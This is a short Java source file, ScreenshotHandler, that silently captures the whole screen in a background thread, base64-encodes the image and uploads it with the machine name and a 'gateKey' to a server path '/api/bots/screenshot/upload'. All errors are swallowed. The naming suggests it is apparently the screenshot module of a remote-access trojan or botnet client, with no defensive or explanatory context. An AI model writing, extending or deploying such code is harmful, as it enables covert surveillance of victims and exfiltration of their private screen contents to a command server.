import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.Base64;
import javax.imageio.ImageIO;

public class ScreenshotHandler {

    public static void capture(String serverUrl, String gateKey, String pcName) {
        new Thread(() -> {
            try {
                Robot robot = new Robot();
                Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
                BufferedImage screenshot = robot.createScreenCapture(screenRect);

                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                ImageIO.write(screenshot, "png", baos);
                byte[] imageBytes = baos.toByteArray();
                baos.close();

                String base64Image = Base64.getEncoder().encodeToString(imageBytes);

                String encodedPc = URLEncoder.encode(pcName, "UTF-8");
                URL url = new URL(serverUrl + "/api/bots/screenshot/upload");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setConnectTimeout(15000);
                conn.setReadTimeout(30000);
                conn.setDoOutput(true);

                String cleanPc = pcName.replace("\\", "\\\\").replace("\"", "\\\"");
                String cleanGk = gateKey.replace("\"", "\\\"");

                String json = "{\"gateKey\":\"" + cleanGk + "\",\"pcName\":\"" + cleanPc + "\",\"image\":\"" + base64Image + "\"}";

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(json.getBytes("UTF-8"));
                }

                int code = conn.getResponseCode();
                conn.disconnect();

            } catch (Exception e) {
            }
        }).start();
    }
}